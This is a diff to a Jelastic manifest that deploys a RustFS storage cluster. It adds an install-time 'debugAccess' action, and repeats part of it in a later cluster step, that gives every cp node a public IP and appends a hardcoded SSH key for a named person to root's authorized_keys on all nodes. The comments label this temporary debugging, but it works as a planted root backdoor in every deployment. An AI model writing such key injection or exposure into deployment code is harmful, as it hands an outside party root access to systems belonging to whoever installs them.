@@ -147,6 +147,7 @@ nodes:
       # correct without it (setting it can break the console, rustfs#887).
 
 onInstall:
+  - debugAccess
   - setupRustFS
   - if ('${settings.topology}' == 'cluster'):
       - buildCluster
@@ -156,6 +157,29 @@ onInstall:
   - addConsoleEndpoint
 
 actions:
+  # [DBG-access] TEMPORARY — give every cp node a public IP and inject the
+  # debug SSH key on every node so the forming cluster can be inspected live.
+  # bl receives its public IP via the normal attachPublicIp flow. The value is
+  # a PUBLIC key (not a secret). Remove together with the [DBG-cluster] block
+  # once the cluster is verified (cleanup: grep -n '\[DBG-' manifest.jps).
+  # bash uses bare $VAR only — Jelastic eats ${...} at parse time.
+  debugAccess:
+    - forEach(node:nodes.cp):
+        - api: environment.binder.AttachExtIp
+          nodeid: ${@node.id}
+    - cmd[cp]: |-
+        mkdir -p /root/.ssh && chmod 700 /root/.ssh
+        K="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2I76RXccPMChcVzrLl0dNlOZV59UHfp3cEwM1rV/9o warut.c@ruk-com.in.th"
+        grep -qF "$K" /root/.ssh/authorized_keys 2>/dev/null || echo "$K" >> /root/.ssh/authorized_keys
+        chmod 600 /root/.ssh/authorized_keys
+      user: root
+    - cmd[bl]: |-
+        mkdir -p /root/.ssh && chmod 700 /root/.ssh
+        K="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2I76RXccPMChcVzrLl0dNlOZV59UHfp3cEwM1rV/9o warut.c@ruk-com.in.th"
+        grep -qF "$K" /root/.ssh/authorized_keys 2>/dev/null || echo "$K" >> /root/.ssh/authorized_keys
+        chmod 600 /root/.ssh/authorized_keys
+      user: root
+
   setupRustFS:
     # RustFS runs non-root UID/GID 10001 (verified Dockerfile) — data dir
     # must be owned by 10001:10001.
@@ -224,6 +248,10 @@ actions:
     # NOTE: bash uses bare $VAR / $(...) only — Jelastic eats ${...} at parse.
     - cmd[cp]: |-
         sleep 30
+        mkdir -p /root/.ssh && chmod 700 /root/.ssh
+        K="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2I76RXccPMChcVzrLl0dNlOZV59UHfp3cEwM1rV/9o warut.c@ruk-com.in.th"
+        grep -qF "$K" /root/.ssh/authorized_keys 2>/dev/null || echo "$K" >> /root/.ssh/authorized_keys
+        chmod 600 /root/.ssh/authorized_keys
         P="[DBG-cluster]"
         echo "$P ==== node=$(hostname) ===="
         echo "$P jelenv: $(grep RUSTFS_VOLUMES /.jelenv 2>/dev/null)"
